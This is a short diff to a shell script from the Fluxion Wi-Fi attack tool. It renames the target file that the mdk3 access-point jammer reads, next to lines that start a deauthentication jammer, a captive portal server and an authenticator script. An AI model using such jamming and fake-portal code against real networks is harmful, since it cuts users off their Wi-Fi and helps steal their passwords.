@@ -864,8 +864,8 @@ function start_attack() {
 	CaptivePortalServerPID=$!
 
 	echo -e "$FLUXIONVLine Starting access point jammer as daemon..."
-    echo -e "$APTargetMAC" > "$FLUXIONWorkspacePath/mdk3.txt"
-    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "FLUXION AP Jammer [mdk3]  $APTargetSSID" -e mdk3 $WIMonitor d -b "$FLUXIONWorkspacePath/mdk3.txt" -c $APTargetChannel &
+    echo -e "$APTargetMAC" > "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
+    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "FLUXION AP Jammer [mdk3]  $APTargetSSID" -e mdk3 $WIMonitor d -b "$FLUXIONWorkspacePath/mdk3_blacklist.lst" -c $APTargetChannel &
 
 	echo -e "$FLUXIONVLine Starting authenticator script..."
     xterm -hold $TOPRIGHT -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
